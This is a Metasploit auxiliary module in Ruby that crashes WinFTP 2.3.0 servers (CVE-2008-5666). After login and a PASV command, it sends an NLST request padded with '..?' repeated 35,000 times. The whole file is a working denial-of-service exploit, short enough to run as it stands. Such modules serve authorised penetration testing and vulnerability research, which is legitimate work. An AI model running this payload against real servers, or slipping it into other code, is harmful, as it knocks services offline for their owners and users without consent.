##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Ftp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'WinFTP 2.3.0 NLST Denial of Service',
      'Description'    => %q{
        This module is a very rough port of Julien Bedard's
        PoC.  You need a valid login, but even anonymous can
        do it if it has permission to call NLST.
      },
      'Author'         => 'kris katterjohn',
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2008-5666' ],
          [ 'OSVDB', '49043' ],
          [ 'EDB', '6581' ]
        ],
      'DisclosureDate' => 'Sep 26 2008'))
  end

  def run
    return unless connect_login

    # NLST has to follow a PORT or PASV
    resp = send_cmd(['PASV'])

    raw_send("NLST #{'..?' * 35000}\r\n")

    disconnect
  end
end
